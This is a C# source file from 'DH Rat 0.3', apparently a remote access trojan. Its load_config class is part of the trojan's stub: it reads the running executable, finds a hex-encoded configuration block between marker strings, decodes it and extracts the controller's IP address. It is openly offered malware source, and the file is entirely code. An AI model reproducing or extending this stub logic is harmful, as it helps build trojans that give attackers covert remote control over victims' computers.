// DH Rat 0.3
// Class load_config
// (C) Doddy Hackman 2014

using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace stub
{
    class load_config
    {
        string rat_online_config = "";
        string ip_config = "";

        public string rat_online
        {
            set { rat_online_config = value; }
            get { return rat_online_config; }
        }

        public string ip
        {
            set { ip_config = value; }
            get { return ip_config; }
        }

        public string hexencode(string texto)
        {
            string resultado = "";

            byte[] enc = Encoding.Default.GetBytes(texto);
            resultado = BitConverter.ToString(enc);
            resultado = resultado.Replace("-", "");
            return "0x" + resultado;
        }

        public string hexdecode(string texto)
        {

            // Based on : http://snipplr.com/view/36461/string-to-hex----hex-to-string-convert/
            // Thanks to emregulcan

            string valor = texto.Replace("0x", "");
            string retorno = "";

            while (valor.Length > 0)
            {
                retorno = retorno + System.Convert.ToChar(System.Convert.ToUInt32(valor.Substring(0, 2), 16));
                valor = valor.Substring(2, valor.Length - 2);
            }

            return retorno.ToString();
        }

        public load_config()
        {

            string rat_online_config = "";
            string ip_config = "";
        }

        public void load_data()
        {
            StreamReader viendo = new StreamReader(Application.ExecutablePath);
            string contenido = viendo.ReadToEnd();
            Match regex = Regex.Match(contenido, "-63686175-(.*?)-63686175-", RegexOptions.IgnoreCase);

            if (regex.Success)
            {
                string comandos = regex.Groups[1].Value;
                if (comandos != "" || comandos != " ")
                {

                    rat_online_config = "1";

                    string leyendo = hexdecode(comandos);
                    regex = Regex.Match(leyendo, "-ip-(.*)-ip-", RegexOptions.IgnoreCase);
                    if (regex.Success)
                    {
                        ip_config = regex.Groups[1].Value;
                    }
                }
                else
                {
                    rat_online_config = "0";
                }
            }
        }

        public string get_data()
        {
            string lista = "";

            lista = "[+] Rat Online : " + rat_online_config + "\n" +
                    "[+] IP : " + ip_config + "\n";
            return lista;
        }

    }
}

// The End ?